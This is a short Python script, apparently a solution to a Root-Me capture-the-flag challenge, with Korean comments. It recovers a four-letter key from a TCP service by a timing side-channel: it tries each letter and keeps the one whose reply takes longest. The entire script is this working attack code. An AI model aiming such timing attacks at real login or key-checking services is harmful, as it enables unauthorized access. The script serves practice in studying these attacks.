
import socket
import time

def getFlag():
    TCP_IP = '192.168.0.14'  # 서버 IP (challenge01.root-me.org에 맞게 변경)
    TCP_PORT = 3333
    BUFFER_SIZE = 1024

    print("[+] Connecting To %s:%d" % (TCP_IP, TCP_PORT))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((TCP_IP, TCP_PORT))
    data = s.recv(BUFFER_SIZE)

    print(data)

    chars = "abcdefghijklmnopqrstuvwxyz"
    key = ''

    for i in range(4):
        time_char = 0
        char_found = ''

        for c in chars:
            s.send((key + c).encode())  # 문자열을 바이트로 변환하여 전송
            debut = time.time()
            data = s.recv(BUFFER_SIZE)
            fin = time.time()
            diff = fin - debut
            print(c, "time =", diff)
            if diff > time_char:
                time_char = diff
                char_found = c

        key += char_found
        print("[+] - key :", key)

    s.close()
    return key

def main():
    flag = getFlag()
    print("[+] - Flag is :", flag)


if __name__ == '__main__':
    main()

